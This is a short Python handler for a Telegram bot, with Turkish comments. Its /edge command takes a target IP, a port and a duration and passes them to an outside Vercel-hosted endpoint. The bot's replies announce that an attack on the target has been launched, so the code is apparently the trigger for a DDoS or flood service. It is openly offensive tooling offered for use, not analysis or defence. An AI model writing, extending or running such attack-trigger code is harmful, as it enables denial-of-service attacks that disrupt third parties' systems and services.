import requests

@bot.message_handler(commands=['edge'])
def edge_attack(message):
    if message.from_user.id == ADMIN_ID:
        try:
            args = message.text.split()
            if len(args) < 4:
                bot.reply_to(message, "❌ Kullanım: /edge <ip> <port> <süre>")
                return
            
            ip, port, sure = args[1], args[2], args[3]
            
            # YENİ LİNKİN BURASI KANKA
            vercel_url = f"https://ordu-eta.vercel.app/?ip={ip}&port={port}&time={sure}"
            
            # Vercel'e tetik gönderiyoruz
            response = requests.get(vercel_url, timeout=5)
            
            if response.status_code == 200:
                bot.reply_to(message, f"🌍 **Washington (iad1) Hattı Açıldı!**\n🎯 Hedef: {ip}\n⏱ Süre: {sure} sn\n🚀 Mermiler yola çıktı!")
            else:
                bot.reply_to(message, "⚠️ Vercel cevap verdi ama motor teklemiş olabilir.")
                
        except Exception as e:
            # Vercel bazen timeout verir ama saldırı arkada başlar
            bot.reply_to(message, f"🚀 Saldırı tetiklendi kanka! (Not: {e})")
